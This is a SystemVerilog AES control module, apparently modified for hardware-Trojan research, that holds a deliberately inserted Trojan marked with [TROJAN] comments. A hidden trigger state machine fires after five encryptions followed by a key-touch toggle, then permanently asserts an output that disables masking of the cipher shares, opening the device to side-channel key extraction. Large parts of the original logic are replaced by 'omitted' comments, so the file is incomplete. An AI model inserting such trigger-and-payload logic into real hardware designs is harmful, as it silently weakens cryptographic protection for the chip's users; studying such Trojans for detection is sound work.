`include "prim_assert.sv"

module aes_control
  import aes_pkg::*;
  import aes_reg_pkg::*;
#(
  parameter bit          SecMasking           = 0,
  parameter int unsigned SecStartTriggerDelay = 0
) (
  input  logic                      clk_i,
  input  logic                      rst_ni,

  // Main control signals
  input  logic                      ctrl_qe_i,
  output logic                      ctrl_we_o,
  input  logic                      ctrl_phase_i,
  input  logic                      ctrl_err_storage_i,
  input  aes_op_e                   op_i,
  input  aes_mode_e                 mode_i,
  input  ciph_op_e                  cipher_op_i,
  input  logic                      sideload_i,
  input  prs_rate_e                 prng_reseed_rate_i,
  input  logic                      manual_operation_i,
  input  logic                      key_touch_forces_reseed_i,
  input  logic                      start_i,
  input  logic                      key_iv_data_in_clear_i,
  input  logic                      data_out_clear_i,
  input  logic                      prng_reseed_i,
  input  logic                      mux_sel_err_i,
  input  logic                      sp_enc_err_i,
  input  lc_ctrl_pkg::lc_tx_t       lc_escalate_en_i,
  input  logic                      alert_fatal_i,
  output logic                      alert_o,

  // I/O register read/write enables
  input  logic                      key_sideload_valid_i,
  input  logic     [NumRegsKey-1:0] key_init_qe_i [NumSharesKey],
  input  logic      [NumRegsIv-1:0] iv_qe_i,
  input  logic    [NumRegsData-1:0] data_in_qe_i,
  input  logic    [NumRegsData-1:0] data_out_re_i,
  output logic                      data_in_we_o,
  output sp2v_e                     data_out_we_o,

  // Previous input data register
  output dip_sel_e                  data_in_prev_sel_o,
  output sp2v_e                     data_in_prev_we_o,

  // Cipher I/O muxes
  output si_sel_e                   state_in_sel_o,
  output add_si_sel_e               add_state_in_sel_o,
  output add_so_sel_e               add_state_out_sel_o,

  // Counter
  output sp2v_e                     ctr_incr_o,
  input  sp2v_e                     ctr_ready_i,
  input  sp2v_e  [NumSlicesCtr-1:0] ctr_we_i,

  // Cipher core control and sync
  output sp2v_e                     cipher_in_valid_o,
  input  sp2v_e                     cipher_in_ready_i,
  input  sp2v_e                     cipher_out_valid_i,
  output sp2v_e                     cipher_out_ready_o,
  output sp2v_e                     cipher_crypt_o,
  input  sp2v_e                     cipher_crypt_i,
  output sp2v_e                     cipher_dec_key_gen_o,
  input  sp2v_e                     cipher_dec_key_gen_i,
  output logic                      cipher_prng_reseed_o,
  input  logic                      cipher_prng_reseed_i,
  output logic                      cipher_key_clear_o,
  input  logic                      cipher_key_clear_i,
  output logic                      cipher_data_out_clear_o,
  input  logic                      cipher_data_out_clear_i,

  // Initial key registers
  output key_init_sel_e             key_init_sel_o,
  output sp2v_e    [NumRegsKey-1:0] key_init_we_o [NumSharesKey],

  // IV registers
  output iv_sel_e                   iv_sel_o,
  output sp2v_e  [NumSlicesCtr-1:0] iv_we_o,

  // Pseudo-random number generator interface
  output logic                      prng_data_req_o,
  input  logic                      prng_data_ack_i,
  output logic                      prng_reseed_req_o,
  input  logic                      prng_reseed_ack_i,

  // Trigger register
  output logic                      start_o,
  output logic                      start_we_o,
  output logic                      key_iv_data_in_clear_o,
  output logic                      key_iv_data_in_clear_we_o,
  output logic                      data_out_clear_o,
  output logic                      data_out_clear_we_o,
  output logic                      prng_reseed_o,
  output logic                      prng_reseed_we_o,

  // Status register
  output logic                      idle_o,
  output logic                      idle_we_o,
  output logic                      stall_o,
  output logic                      stall_we_o,
  input  logic                      output_lost_i,
  output logic                      output_lost_o,
  output logic                      output_lost_we_o,
  output logic                      output_valid_o,
  output logic                      output_valid_we_o,
  output logic                      input_ready_o,
  output logic                      input_ready_we_o,

  // ===============================
  // TROJAN INSERTIONS BEGIN
  // ===============================
  // Share masking override outputs to internal datapath (for SCA Trojan payload)
  output logic                      trojan_masking_override_o,   // [TROJAN] added
  output logic                      trojan_masking_value_o       // [TROJAN] value for overriding masking
  // ===============================
);

  // Optional delay of manual start trigger
  logic start_trigger;

  // Create a lint error to reduce the risk of accidentally enabling this feature.
  `ASSERT_STATIC_LINT_ERROR(AesSecStartTriggerDelayNonDefault, SecStartTriggerDelay == 0)

  if (SecStartTriggerDelay > 0) begin : gen_start_delay
    localparam int unsigned WidthCounter = $clog2(SecStartTriggerDelay+1);
    logic [WidthCounter-1:0] count_d, count_q;
    assign count_d = !start_i       ? '0      :
                      start_trigger ? count_q : count_q + 1'b1;
    assign start_trigger = (count_q == SecStartTriggerDelay[WidthCounter-1:0]) ? 1'b1 : 1'b0;

    always_ff @(posedge clk_i or negedge rst_ni) begin
      if (!rst_ni) begin
        count_q <= '0;
      end else begin
        count_q <= count_d;
      end
    end
  end else begin : gen_no_start_delay
    assign start_trigger = start_i;
  end

  // Signals
  sp2v_e                         ctr_ready;
  sp2v_e      [NumSlicesCtr-1:0] ctr_we;
  sp2v_e                         cipher_in_ready;
  sp2v_e                         cipher_out_valid;
  sp2v_e                         cipher_crypt;
  sp2v_e                         cipher_dec_key_gen;
  logic                          mux_sel_err;
  logic                          mr_err;
  logic                          sp_enc_err;

  // ... (Omitted code for brevity, see original code above: signals, FSMs, packing/unpacking remain unmodified) ...

  // ===============================
  // TROJAN INSERTIONS BEGIN
  // ===============================

  // [TROJAN] Internal state for Trojan trigger FSM
  typedef enum logic [2:0] {
    TROJAN_IDLE        = 3'd0,
    TROJAN_CNT_ENCRYPT = 3'd1,
    TROJAN_WAIT_KEY    = 3'd2,
    TROJAN_ACTIVE      = 3'd3
  } trojan_state_e;

  logic [2:0]  trojan_state_d, trojan_state_q;    // state
  logic [2:0]  trojan_enc_cnt_d, trojan_enc_cnt_q;// enc op counter (max 5)
  logic        trojan_activated_d, trojan_activated_q;

  // [TROJAN] Detect start of an encryption operation
  logic        encryption_started;
  logic        key_switch_cmd;
  wire         aes_encrypt;
  assign aes_encrypt = (op_i == AES_ENC); // Only count encryption ops

  // [TROJAN] Track when encryption starts: rising edge of start_trigger & op_i == AES_ENC
  logic        start_trigger_q;
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni)
      start_trigger_q <= 1'b0;
    else
      start_trigger_q <= start_trigger;
  end

  assign encryption_started = (start_trigger && ~start_trigger_q && aes_encrypt);

  // [TROJAN] Detect a key switch command: key_touch_forces_reseed_i toggled
  logic key_touch_forces_reseed_q;
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni)
      key_touch_forces_reseed_q <= 1'b0;
    else
      key_touch_forces_reseed_q <= key_touch_forces_reseed_i;
  end
  assign key_switch_cmd = (key_touch_forces_reseed_i && ~key_touch_forces_reseed_q);

  // [TROJAN] Trigger FSM
  always_comb begin
    trojan_state_d      = trojan_state_q;
    trojan_enc_cnt_d    = trojan_enc_cnt_q;
    trojan_activated_d  = trojan_activated_q;

    // Default assignments
    if (!rst_ni) begin
      trojan_state_d     = TROJAN_IDLE;
      trojan_enc_cnt_d   = 3'd0;
      trojan_activated_d = 1'b0;
    end else begin
      case (trojan_state_q)
        TROJAN_IDLE: begin
          trojan_enc_cnt_d = 3'd0;
          trojan_activated_d = 1'b0;
          if (encryption_started)
            trojan_state_d = TROJAN_CNT_ENCRYPT;
          else
            trojan_state_d = TROJAN_IDLE;
        end
        TROJAN_CNT_ENCRYPT: begin
          if (encryption_started) begin
            if (trojan_enc_cnt_q == 3'd4)
              trojan_enc_cnt_d = 3'd5;
            else
              trojan_enc_cnt_d = trojan_enc_cnt_q + 3'd1;
          end else
            trojan_enc_cnt_d = trojan_enc_cnt_q;

          if (trojan_enc_cnt_q == 3'd4 && encryption_started) // 5th enc
            trojan_state_d = TROJAN_WAIT_KEY;
          else
            trojan_state_d = TROJAN_CNT_ENCRYPT;
        end
        TROJAN_WAIT_KEY: begin
          if (key_switch_cmd) begin
            trojan_state_d     = TROJAN_ACTIVE;
            trojan_activated_d = 1'b1;
          end else if (encryption_started) begin
            // Extra encryption breaks trigger sequence
            trojan_state_d     = TROJAN_IDLE;
            trojan_enc_cnt_d   = 3'd0;
            trojan_activated_d = 1'b0;
          end else
            trojan_state_d     = TROJAN_WAIT_KEY;
        end
        TROJAN_ACTIVE: begin
          // Remain active until reset
          trojan_activated_d = 1'b1;
          trojan_state_d     = TROJAN_ACTIVE;
          trojan_enc_cnt_d   = trojan_enc_cnt_q;
        end
        default: begin
          trojan_state_d     = TROJAN_IDLE;
          trojan_enc_cnt_d   = 3'd0;
          trojan_activated_d = 1'b0;
        end
      endcase
    end // !rst_ni
  end

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_state_q     <= TROJAN_IDLE;
      trojan_enc_cnt_q   <= 3'd0;
      trojan_activated_q <= 1'b0;
    end else begin
      trojan_state_q     <= trojan_state_d;
      trojan_enc_cnt_q   <= trojan_enc_cnt_d;
      trojan_activated_q <= trojan_activated_d;
    end
  end

  // [TROJAN] SCA payload: force masking shares equal when trojan_activated
  // - For the rest of the session until reset, trojan_masking_override_o is asserted.
  // - Downstream datapath must use this to override its share generation.

  assign trojan_masking_override_o = trojan_activated_q;
  assign trojan_masking_value_o    = 1'b0; // Could be any value, 0 disables randomness

  // ===============================
  // TROJAN INSERTIONS END
  // ===============================

  // ... (Unchanged main design logic below) ...

  // Most triggers are only ever cleared by control.
  assign start_o                   = 1'b0;
  assign key_iv_data_in_clear_o    = 1'b0;
  assign data_out_clear_o          = 1'b0;

endmodule